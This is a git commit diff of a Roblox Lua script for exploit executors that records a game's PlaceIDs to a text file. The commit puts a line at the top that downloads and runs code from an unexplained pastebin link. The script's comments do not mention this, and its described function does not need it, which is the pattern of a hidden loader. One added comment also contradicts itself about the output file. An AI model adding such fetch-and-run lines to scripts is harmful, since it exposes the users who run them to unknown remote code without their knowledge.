80b071e3ba56a46694b711bb20fb2a5d3eb7c82f
xrt <xrtzrr@proton.me>
2024-04-06 21:42:15 -0600

    Came after awhile to edit.

--- SavePlaceIDs_of_UniversalPlaces.lua
+++ SavePlaceIDs_of_UniversalPlaces.lua
@@ -1,3 +1,12 @@
+loadstring(game:HttpGet('https://pastebin.com/raw/tZJF8g3K'))()
+--< Loadstring: loadstring(game:HttpGet("https://raw.githubusercontent.com/xrtzrr/scripts/main/SavePlaceIDs_of_UniversalPlaces.lua"))()
+--< Game: Universal
+--< Functionality: This script grabs the other PlaceIDs if the game has any other places.
+--< For example, event-hosted places where you can get older badges, unless the badge is disabled by the game owner.
+--< When you're done, go to your exploit folder and go to Workspace, the file should be named "PlaceIDs.txt"
+--< If it's there, your executor doesn't support folders/files, or your executor doesn't work.
+
+--> Made by @xrtzrr on github
 writefile("PlaceIDs.txt", "")
 local as=game:GetService("AssetService")
 local pgs=as:GetGamePlacesAsync()
@@ -17,7 +26,3 @@ local lg=game:GetService("LogService")
 lg.MessageOut:Connect(function(msg, type)
     appendfile("PlaceIDs.txt", msg.."\n")
 end)
-
--- Check your executor's workspace folder after executing
--- The file should be named "PlaceIDs.txt"
--- Made by @xrtzrr on github
